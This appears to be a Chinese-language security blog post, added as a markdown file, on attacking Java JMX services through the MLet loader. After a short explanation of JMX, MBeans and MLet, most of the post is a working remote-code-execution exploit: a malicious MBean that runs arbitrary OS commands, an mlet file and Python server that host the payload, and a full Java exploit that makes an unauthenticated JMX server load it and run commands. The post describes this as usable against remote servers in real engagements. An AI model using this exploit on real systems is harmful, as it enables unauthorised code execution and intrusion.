@@ -1,0 +1,279 @@
+---
+title: JMX 攻防
+date: 2025-01-20
+tags:
+  - JAVA
+  - SEC
+draft: false
+images: ['/static/images/blog/2025/c41139/Pasted%20image%2020250120204829.png']
+authors: ['default']
+---
+
+#java #web #sec
+
+## CONCEPTION
+
+### JMX
+
+- JMX Java Management Extensions 即 Java 管理扩展
+
+为了标准化管理和监控，Java 平台使用 JMX 作为管理和监控的标准接口，任何程序，只要按 JMX 规范访问这个接口，就可以获取所有管理与监控信息。
+
+#### JMX 和 RMI
+
+- **RMI** 是一种远程调用协议，**JMX** 是一个管理框架
+
+在 JMX 中，远程管理功能使用了 RMI 作为底层通信协议，所以一般看到开了 RMI 的端口，可以测一下有没有 JMX 的漏洞。
+
+### Mbean
+
+JMX把所有**被管理的资源**都称为MBean（Managed Bean），这些MBean全部由MBeanServer管理，如果要访问 MBean，可以通过 MBeanServer 对外提供的访问接口，例如通过RMI或HTTP访问。
+
+- 注意，使用JMX不需要安装任何额外组件，也不需要第三方库，因为MBeanServer已经内置在JavaSE标准库中了。
+
+JavaSE还提供了一个`jconsole`程序，用于通过RMI连接到MBeanServer，这样就可以管理整个Java进程。
+
+除了自身的各种资源会以 MBean 注册到 JMX 中，我们自己的配置、监控信息也可以作为 MBean 注册到 JMX，这样，管理程序就可以直接控制我们暴露的 MBean。因此，应用程序使用JMX，只需要两步：
+
+1. 编写MBean提供管理接口和监控数据；
+2. 注册MBean。
+
+### MLet
+
+- MLet 在高版本被弃用
+
+MLet 是一种用于管理 Java MBean 的机制，能够从**远程** URL 加载和注册 MBean。它是 `URLClassLoader` 的一个子类，支持动态加载 Java 类。
+
+MLet 有一个 `getMBeansFromURL` 方法，可以使用远程的 MBean，也正是因为这个原因才导致 JMX 存在远程代码执行漏洞的可能
+
+- 工作流程：MLet 服务会解析 MLet 文本文件，加载并注册其中定义的 MBean，从而实现动态管理。
+
+---
+
+## 调用 MLet 注册恶意 MBean 致 RCE
+
+- 一般需要 JMX 未授权
+- Java8
+
+### 本地打包一个恶意类 EvilMBean
+
+先定义接口 EvilMBean.java：
+
+```java
+public interface EvilMBean {
+    public String runCommand(String cmd);
+}
+```
+
+再定义恶意类 Evil.java
+
+```java
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Evil implements EvilMBean{
+    @Override
+    public String runCommand(String cmd){
+        try {
+            Runtime rt = Runtime.getRuntime();
+            Process proc = rt.exec(cmd);
+
+            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+            String stdout_err_data = "";
+            String s;
+            while ((s = stdInput.readLine()) != null) {
+                stdout_err_data += s + "\n";
+            }
+            while ((s = stdError.readLine()) != null) {
+                stdout_err_data += s + "\n";
+            }
+            proc.waitFor();
+            return stdout_err_data;
+
+        } catch (Exception e) {
+            return e.toString();
+        }
+    }
+}
+```
+
+恶意类打包成 `JMXPayload.jar`：
+
+```bash
+javac Evil.java EvilMBean.java
+jar -cvf JMXPayload.jar Evil.class EvilMBean.class
+```
+
+### 起一个本地服务器放恶意类
+
+先写一个 mlet 文件：
+
+```html
+<html>
+  <mlet
+    code="Evil"
+    archive="JMXPayload.jar"
+    name="MLetCompromise1:name=Evil,id=10"
+    codebase="http://127.0.0.1:4141"
+  ></mlet>
+</html>
+```
+
+`getMBeansFromURL` 需要通过 melt 文件才能**远程**下载 JMXPayload.jar 文件。
+
+确保 JMXPayload.jar 和 mlet 放在网站同一目录下，起一个简单的本地服务器：
+
+- 我们要测试的远程服务器需要从（本地起的）放了恶意文件的服务器上加载恶意 MBean
+
+```bash
+python3 -m http.server 4141
+```
+
+### 本地起一个 JMX server
+
+本地起一个 JMX server 模拟实战中远端需要攻击的 JMX server。
+
+JMXServer.java
+
+```java
+import java.io.IOException;
+import java.lang.management.ManagementFactory;
+import java.net.MalformedURLException;
+import java.rmi.registry.LocateRegistry;
+
+import javax.management.MBeanServer;
+import javax.management.remote.JMXConnectorServer;
+import javax.management.remote.JMXConnectorServerFactory;
+import javax.management.remote.JMXServiceURL;
+
+// 模拟远端的 JMX server
+public class JMXServer {
+    public static void main(String[] args) throws Exception {
+
+        MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
+        try {
+
+            LocateRegistry.createRegistry(9999);
+            JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://127.0.0.1:9999/jmxrmi");
+            JMXConnectorServer cs = JMXConnectorServerFactory.newJMXConnectorServer(url, null, mbs);
+            System.out.println("....................begin rmi start.....");
+            cs.start();
+            System.out.println("....................rmi start.....");
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+启动：
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120204111.png)
+
+### exp
+
+ExploitJMXByRemoteMBean.java：
+
+1. 连接到 JMX server （测试在本地，实战此处连接的是远程 server）
+2. 加载 MLet 类
+3. 通过 MLet 类（在本地起的python小服务器上）找到远程恶意类 MBean
+
+```java
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.util.HashSet;
+import java.util.Iterator;
+
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectInstance;
+import javax.management.ObjectName;
+import javax.management.remote.JMXConnector;
+import javax.management.remote.JMXConnectorFactory;
+import javax.management.remote.JMXServiceURL;
+
+public class ExploitJMXByRemoteMBean {
+
+    public static void main(String[] args) {
+        try {
+            // connectAndOwn(args[0], args[1], args[2]);
+            exp("127.0.0.1", "9999", "whoami");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    static void exp(String serverName, String port, String command) throws MalformedURLException {
+        try {
+            // step1. 连接到 JMX server （测试在本地，实战此处连接的是远程 server）
+            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
+            System.out.println("URL: " + u + ", connecting");
+            JMXConnector c = JMXConnectorFactory.connect(u);
+            System.out.println("Connected: " + c.getConnectionId());
+            MBeanServerConnection m = c.getMBeanServerConnection();
+
+            // step2. 加载 MLet 类
+            ObjectInstance eviMLet = null;
+            try {
+                eviMLet = m.createMBean("javax.management.loading.MLet", null);
+            } catch (javax.management.InstanceAlreadyExistsException e) {
+                eviMLet = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
+            }
+
+            // step3：通过 MLet 类加载远程恶意类 MBean
+            ObjectInstance evilBean = null;
+            System.out.println("Loaded " + eviMLet.getClassName());
+            Object res = m.invoke(eviMLet.getObjectName(), "getMBeansFromURL",
+                    new Object[] { String.format("http://%s:4141/mlet", InetAddress.getLocalHost().getHostAddress()) },
+                    new String[] { String.class.getName() });
+
+            // 使用迭代器遍历 res 集合中的元素，处理加载过程中可能出现的异常情况
+            HashSet res_set = ((HashSet) res);
+            Iterator itr = res_set.iterator();
+            Object nextObject = itr.next();
+            if (nextObject instanceof Exception) {
+                throw ((Exception) nextObject);
+            }
+            evilBean = ((ObjectInstance) nextObject);
+
+            // step4: 执行恶意类 MBean
+            System.out.println("Loaded class: " + evilBean.getClassName() + " object " + evilBean.getObjectName());
+            System.out.println("Calling runCommand with: " + command);
+            Object result = m.invoke(evilBean.getObjectName(), "runCommand", new Object[] { command },
+                    new String[] { String.class.getName() });
+            System.out.println("Result: " + result);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+成功执行 `whoami`：
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120203429.png)
+
+本地放恶意类的python小服务器上也有对应的请求：
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120204009.png)
+
+### jconsole 看看
+
+- java 自带的小工具
+
+用 jconsole 看一下模拟的远端JMX server：
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120204534.png)
+
+runCommand 成功写入模拟远端 server，可以RCE：
+
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120204617.png)
+
+弹个计算器：
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120204758.png)
+
+![](/static/images/blog/2025/c41139/Pasted%20image%2020250120204829.png)
+
+---
+
+## REFERENCE
+
+- [JAVA安全之JMX攻防研究分析 - 先知社区](https://xz.aliyun.com/t/16417?time__1311=GuD%3Dq%2BxhODkD%2FD0liGkFy4fn9DO3AeD#toc-4)
